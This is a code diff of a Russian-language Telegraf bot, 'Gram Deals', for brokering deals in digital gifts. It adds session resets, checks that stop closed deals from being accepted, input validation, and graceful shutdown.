@@ -3,6 +3,7 @@ const dotenv = require('dotenv');
 dotenv.config();
 
 const bot = new Telegraf(process.env.TOKEN);
+const BOT_USERNAME = 'GramsDealBot'; // Укажите имя вашего бота (без @)
 
 // ===== Хранилища данных (в памяти) =====
 const users = new Map(); // userId -> { balance, deals, verified, cards, tonWallets, totalDeals, successDeals, turnover }
@@ -34,6 +35,12 @@ function generateDealId() {
   return id;
 }
 
+// ===== Сброс сессии =====
+function resetSession(ctx) {
+  ctx.session.deal = null;
+  ctx.session.awaiting = null;
+}
+
 // ===== Middleware сессии =====
 bot.use(session());
 
@@ -48,11 +55,15 @@ bot.start(async (ctx) => {
       await ctx.reply('❌ Сделка не найдена или уже закрыта.');
       return;
     }
+    if (deal.status !== 'open') {
+      await ctx.reply('❌ Эта сделка уже неактивна.');
+      return;
+    }
     await ctx.reply(
       `📦 Вы перешли по ссылке сделки #${dealId}\n\n` +
       `Покупатель: @${ctx.from.username || 'unknown'}\n` +
       `Сумма: ${deal.amount} ${deal.currency}\n` +
-      `Описание:\n${deal.links.join('\n')}\n\n` +
+      `Товар:\n${deal.links.join('\n')}\n\n` +
       `Хотите принять эту сделку?`,
       Markup.inlineKeyboard([
         [Markup.button.callback('✅ Принять', `accept_${dealId}`)],
@@ -64,6 +75,7 @@ bot.start(async (ctx) => {
 
   // Обычный старт
   const user = getUser(ctx.from.id);
+  resetSession(ctx);
   await ctx.reply(
     'Добро пожаловать в Gram Deals!\n\n' +
     'Сервис, обеспечивающий безопасность и удобство проведения сделок с цифровыми подарками.\n\n' +
@@ -79,6 +91,7 @@ bot.start(async (ctx) => {
 // ===== Главное меню =====
 bot.action('main_menu', async (ctx) => {
   await ctx.answerCbQuery();
+  resetSession(ctx);
   await showMainMenu(ctx);
 });
 
@@ -129,6 +142,7 @@ bot.action('promo', async (ctx) => {
 // ===== Создание сделки – выбор роли =====
 bot.action('create_deal', async (ctx) => {
   await ctx.answerCbQuery();
+  resetSession(ctx);
   await ctx.reply(
     'Выберите роль в сделке:',
     Markup.inlineKeyboard([
@@ -160,32 +174,47 @@ bot.action('role_buyer', async (ctx) => {
   ctx.session.awaiting = 'buyer_links';
 });
 
-// ===== Обработка ввода ссылок =====
+// ===== Обработка всех текстовых сообщений =====
 bot.on('text', async (ctx) => {
-  if (ctx.session.awaiting === 'buyer_links') {
-    const links = ctx.message.text.split('\n').filter(s => s.trim());
+  const awaiting = ctx.session.awaiting;
+  const text = ctx.message.text.trim();
+
+  // Если ничего не ожидаем – просто напоминаем использовать кнопки
+  if (!awaiting) {
+    await ctx.reply('Пожалуйста, используйте кнопки для навигации.');
+    return;
+  }
+
+  // === Ввод ссылок ===
+  if (awaiting === 'buyer_links') {
+    const links = text.split('\n').filter(s => s.trim());
     if (links.length === 0) {
-      await ctx.reply('Введите хотя бы одну ссылку.');
+      await ctx.reply('❌ Введите хотя бы одну ссылку.');
       return;
     }
     ctx.session.deal.links = links;
     ctx.session.awaiting = null;
     await showCurrencySelection(ctx);
-  } else if (ctx.session.awaiting === 'buyer_currency') {
-    // Обрабатывается через callback
-  } else if (ctx.session.awaiting === 'buyer_amount') {
-    const amount = parseFloat(ctx.message.text.replace(',', '.'));
+    return;
+  }
+
+  // === Ввод суммы ===
+  if (awaiting === 'buyer_amount') {
+    const amount = parseFloat(text.replace(',', '.'));
     if (isNaN(amount) || amount <= 0) {
-      await ctx.reply('Введите корректное число');
+      await ctx.reply('❌ Введите корректное число');
       return;
     }
     ctx.session.deal.amount = amount;
     ctx.session.awaiting = null;
-    await showDealConfirmation(ctx);
-  } else if (ctx.session.awaiting === 'add_card') {
-    const text = ctx.message.text;
+    await createDeal(ctx);
+    return;
+  }
+
+  // === Добавление карты ===
+  if (awaiting === 'add_card') {
     if (!text.includes('-')) {
-      await ctx.reply('Неверный формат. Используйте: Банк - Номер карты');
+      await ctx.reply('❌ Неверный формат. Используйте: Банк - Номер карты');
       return;
     }
     const user = getUser(ctx.from.id);
@@ -194,10 +223,13 @@ bot.on('text', async (ctx) => {
     await ctx.reply('✅ Карта успешно добавлена!', Markup.inlineKeyboard([
       [Markup.button.callback('← Назад', 'rekvizity')]
     ]));
-  } else if (ctx.session.awaiting === 'add_ton') {
-    const text = ctx.message.text.trim();
+    return;
+  }
+
+  // === Добавление TON ===
+  if (awaiting === 'add_ton') {
     if (!text.startsWith('UQ') && !text.startsWith('EQ')) {
-      await ctx.reply('Неверный адрес TON. Попробуйте снова.');
+      await ctx.reply('❌ Неверный адрес TON. Адрес должен начинаться с UQ или EQ.');
       return;
     }
     const user = getUser(ctx.from.id);
@@ -206,17 +238,16 @@ bot.on('text', async (ctx) => {
     await ctx.reply('✅ TON кошелек успешно добавлен!', Markup.inlineKeyboard([
       [Markup.button.callback('← Назад', 'rekvizity')]
     ]));
-  } else {
-    // Если сообщение не ожидалось – предлагаем использовать кнопки
-    if (ctx.message && ctx.message.text) {
-      await ctx.reply('Пожалуйста, используйте кнопки для навигации.');
-    }
+    return;
   }
+
+  // Если ничего не подошло
+  await ctx.reply('Неизвестная команда. Используйте кнопки.');
 });
 
 // ===== Выбор валюты =====
 async function showCurrencySelection(ctx) {
-  const currencyKeyboard = Markup.inlineKeyboard([
+  const keyboard = Markup.inlineKeyboard([
     [Markup.button.callback('RUB', 'currency_RUB'), Markup.button.callback('EUR', 'currency_EUR')],
     [Markup.button.callback('UZS', 'currency_UZS'), Markup.button.callback('KGS', 'currency_KGS')],
     [Markup.button.callback('KZT', 'currency_KZT'), Markup.button.callback('Stars', 'currency_Stars')],
@@ -224,13 +255,14 @@ async function showCurrencySelection(ctx) {
     [Markup.button.callback('USDT', 'currency_USDT'), Markup.button.callback('GRAM', 'currency_GRAM')],
     [Markup.button.callback('← Назад', 'create_deal')],
   ]);
-  await ctx.reply('Выберите валюту:', currencyKeyboard);
+  await ctx.reply('Выберите валюту:', keyboard);
   ctx.session.awaiting = 'buyer_currency';
 }
 
 bot.action(/currency_(.+)/, async (ctx) => {
   await ctx.answerCbQuery();
   const currency = ctx.match[1];
+  if (!ctx.session.deal) ctx.session.deal = {};
   ctx.session.deal.currency = currency;
   ctx.session.awaiting = null;
   await ctx.reply(
@@ -242,13 +274,16 @@ bot.action(/currency_(.+)/, async (ctx) => {
   ctx.session.awaiting = 'buyer_amount';
 });
 
-// ===== Подтверждение и создание сделки =====
-async function showDealConfirmation(ctx) {
+// ===== Создание сделки =====
+async function createDeal(ctx) {
   const deal = ctx.session.deal;
-  const linksText = deal.links.join('\n');
-  const dealId = generateDealId();
+  if (!deal || !deal.links || !deal.currency || !deal.amount) {
+    await ctx.reply('❌ Ошибка: не все данные заполнены. Попробуйте заново.');
+    resetSession(ctx);
+    return;
+  }
 
-  // Сохраняем сделку
+  const dealId = generateDealId();
   const newDeal = {
     id: dealId,
     role: deal.role,
@@ -267,7 +302,8 @@ async function showDealConfirmation(ctx) {
   user.totalDeals += 1;
   user.turnover += deal.amount;
 
-  const sellerLink = `https://t.me/${ctx.botInfo.username}?start=deal_${dealId}`;
+  const sellerLink = `https://t.me/${BOT_USERNAME}?start=deal_${dealId}`;
+  const linksText = deal.links.join('\n');
 
   let replyText =
     `✅ Сделка создана!\n\n` +
@@ -283,14 +319,13 @@ async function showDealConfirmation(ctx) {
     [Markup.button.url('ПОКАЗАТЬ ПОДАРОК', deal.links[0])]
   ]));
 
-  ctx.session.deal = null;
-  ctx.session.awaiting = null;
+  resetSession(ctx);
 }
 
 // ===== Роль Продавец (упрощённо) =====
 bot.action('role_seller', async (ctx) => {
   await ctx.answerCbQuery('Функция для продавца в разработке');
-  // Здесь можно реализовать аналогичный поток для продавца
+  // Можно реализовать аналогичный поток
 });
 
 // ===== Мои сделки =====
@@ -305,6 +340,7 @@ bot.action('my_deals', async (ctx) => {
 // ===== Управление реквизитами =====
 bot.action('rekvizity', async (ctx) => {
   await ctx.answerCbQuery();
+  resetSession(ctx);
   await ctx.reply(
     '💳 Управление реквизитами\n\nВыберите опцию:',
     Markup.inlineKeyboard([
@@ -336,7 +372,7 @@ bot.action('add_ton', async (ctx) => {
   await ctx.reply(
     '💎 Добавить TON кошелек\n\n' +
     'Пример адреса:\n' +
-    'UQAY6fREx6M7QsnCkUJKNptZdRG-Q_1kW2FAa2Am-aBJ5-7X\n\n' +
+    'UQAY6fREx6M7QsnCkUJKNPtZdRG-Q_1kW2FAa2Am-aBJ5-7X\n\n' +
     'Отправьте адрес вашего TON кошелька:',
     Markup.inlineKeyboard([
       [Markup.button.callback('← Назад', 'rekvizity')]
@@ -371,6 +407,10 @@ bot.action(/accept_(.+)/, async (ctx) => {
     await ctx.answerCbQuery('❌ Сделка не найдена');
     return;
   }
+  if (deal.status !== 'open') {
+    await ctx.answerCbQuery('❌ Сделка уже закрыта');
+    return;
+  }
   deal.sellerId = ctx.from.id;
   deal.status = 'active';
   await ctx.answerCbQuery('✅ Сделка принята!');
@@ -391,5 +431,12 @@ bot.action(/reject_(.+)/, async (ctx) => {
 });
 
 // ===== Запуск бота =====
-bot.launch();
-console.log('✅ Бот запущен');
+bot.launch().then(() => {
+  console.log('✅ Бот успешно запущен');
+}).catch(err => {
+  console.error('❌ Ошибка запуска:', err);
+});
+
+// Graceful stop
+process.once('SIGINT', () => bot.stop('SIGINT'));
+process.once('SIGTERM', () => bot.stop('SIGTERM'));
